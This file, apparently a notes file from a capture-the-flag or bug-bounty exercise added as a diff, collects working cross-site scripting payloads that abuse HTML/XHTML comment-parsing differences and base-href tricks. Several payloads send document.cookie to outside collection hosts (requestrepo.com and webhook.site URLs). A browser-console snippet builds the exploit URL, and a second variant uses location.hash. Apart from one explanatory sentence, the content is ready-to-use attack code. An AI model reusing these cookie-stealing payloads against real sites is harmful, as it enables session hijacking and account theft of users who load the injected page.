@@ -1,0 +1,33 @@
+
+<body><style><!--</style>
+<img src="--></style><base href='(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/7gpkhy4f.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=1//' />"></body> 
+
+<body><style>a { color: <!--}</style>
+<img src="--></style><base href='(document.location=http://123);var[Page]=1//' />">
+</body>
+
+
+<body>
+<style>a { color: <!--}</style>
+<img alt="--></style><base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/7gpkhy4f.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//' />">
+</body>
+
+
+
+HTML comment inside script tag is ignored by HTML parser, but XHTML follows XML so <!-- will be interpreted as comment, which ends at the --> in the alt attribute of the img tag. The var[Page]=[1]; uses var hoisting to prevent the js from throwing error.
+
+
+<div>
+  <div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div>
+  <style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
+
+
+  // run this in browser console to get exploit url
+  ht = `<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>`
+  copy(ht)
+  // need to change the webhook url to your own
+
+
+
+  // cach 2
+  /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#https://webhook.site/3da63e65-1927-4b67-a5a7-da4ee1a2537c?
